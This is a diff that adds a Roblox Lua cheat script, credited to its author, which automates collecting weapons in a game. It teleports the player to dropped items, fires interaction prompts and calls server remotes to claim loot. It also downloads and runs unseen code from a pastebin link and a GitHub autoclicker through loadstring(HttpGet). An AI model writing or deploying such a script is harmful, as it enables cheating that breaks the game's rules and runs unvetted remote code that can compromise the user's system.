@@ -1,0 +1,57 @@
+game.StarterGui:SetCore("SendNotification", {Title = "Credits!", Text = "Made by Luxky#0001", Icon = "rbxassetid://9449248979", Duration = 5})
+
+local plr = game:GetService("Players").LocalPlayer
+local char = plr.Character
+local root = char.HumanoidRootPart
+
+local plrgui = plr.PlayerGui
+local rs = game:GetService("RunService")
+local items
+
+spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/xC2YeBri"))();
+end)
+
+spawn(function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
+end)
+
+spawn(function()
+    rs.RenderStepped:Connect(function()
+	for i,v in pairs(game:GetService("Workspace").Thrown:GetChildren()) do
+        if v.Name == "Model" and v.InteractPrompt then
+        root.CFrame = v.Part.CFrame
+        wait()
+        fireproximityprompt(v.InteractPrompt)
+            end
+        end
+    end)
+end)
+
+spawn(function()
+rs.RenderStepped:Connect(function()
+if plrgui:WaitForChild("ChoicePrompt") then
+    for i,v in pairs(plrgui.ChoicePrompt.ChoiceFrame.Options:GetChildren()) do
+    if v.ClassName == "TextButton" then
+    if v.BackgroundColor3 == Color3.fromRGB(204, 255, 243) then
+    items = v.Name
+    local ohString1 = items
+    game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("ChoicePrompt").Choice:FireServer(ohString1)
+    local ohTable1 = {["1"] = "Weapons",["2"] = items}
+    game:GetService("ReplicatedStorage").Requests.UpdateSlotData:FireServer(ohTable1)
+else
+    wait(3)
+    game:GetService("Workspace").Thrown.Model:Destroy()
+    items = "Nothing"
+    local ohString1 = items
+    game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("ChoicePrompt").Choice:FireServer(ohString1)
+    local ohTable1 = {["1"] = "Weapons",["2"] = items}
+    game:GetService("ReplicatedStorage").Requests.UpdateSlotData:FireServer(ohTable1)
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+
